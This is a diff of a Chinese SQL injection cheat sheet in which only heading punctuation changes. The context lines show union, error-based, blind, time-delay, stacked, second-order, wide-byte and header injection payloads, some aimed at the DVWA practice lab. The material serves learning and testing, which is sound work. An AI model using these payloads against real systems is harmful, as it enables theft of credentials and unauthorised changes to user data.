@@ -1,4 +1,4 @@
-## 联合注入
+## 联合注入：
 ```sql
 select user,password from users where user_id=1 union select 1,2;
 select * from users where user_id = 1 union select * from users where user_id = 2 ;
@@ -24,7 +24,7 @@ id=-1 union select 1,2,3,database(),5,6,7,8
 }
 ```
 
-##报错注入
+##报错注入：
 
 floor函数
 ```sql
@@ -89,7 +89,7 @@ NAME_CONST
 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
 ```
 
-## 盲注
+## 盲注：
 布尔
 ```sql
 1' and left(database(),4)='dvwa' --+
@@ -101,7 +101,7 @@ NAME_CONST
 1 and 1=(user() like 'r%25') --+
 ```
 
-## 延迟注入
+## 延迟注入：
 
 SLEEP函数
 ```sql
@@ -148,12 +148,12 @@ ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE '(a.
 (a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';
 ```
 
-## 堆叠查询
+## 堆叠查询：
 ```sql
 ;select
 ```
 
-## 二阶注入
+## 二阶注入：
 
 注册或更新个人资料如下
 ```sql
@@ -165,14 +165,14 @@ I love programming', email=(SELECT email FROM users WHERE username='admin') --
 子查询(SELECT email FROM users WHERE username='admin'）将执行用管理员用户的电子邮件替换该列
 ```
 
-## 宽字节注入
+## 宽字节注入：
 ```sql
 %bf%27
 %df%5c
 %A8%27
 ```
 
-## HTTP请求头注入
+## HTTP请求头注入：
 ```sql
 User-Agent
 Cookie
